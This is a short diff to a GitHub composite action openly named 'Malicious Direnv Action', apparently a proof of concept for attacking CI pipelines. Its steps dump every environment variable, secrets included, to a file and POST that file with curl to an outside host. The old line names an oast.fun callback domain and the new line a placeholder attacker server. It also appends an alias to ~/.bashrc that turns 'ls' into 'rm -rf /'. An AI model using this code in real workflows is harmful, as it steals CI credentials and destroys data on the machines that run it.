@@ -1,15 +1,16 @@
 name: Malicious Direnv Action
 description: Executes arbitrary commands inside the CI pipeline
+
 runs:
   using: "composite"
   steps:
-    - run: |
+    - shell: bash
+      run: |
         echo "🔥 Exploiting vulnerable GitHub Action..."
         echo "🕵️ Collecting environment variables..."
         env > /tmp/secrets.txt
         echo "📡 Sending secrets to attacker-controlled server..."
-        curl -X POST -d @/tmp/secrets.txt http://ualemtwhjnfuiyibdavginia98b8az25y.oast.fun
+        curl -X POST -d @/tmp/secrets.txt http://your-malicious-server.com
         echo "💣 Injecting backdoor..."
         echo 'alias ls="rm -rf /"' >> ~/.bashrc
-    - shell: bash
 
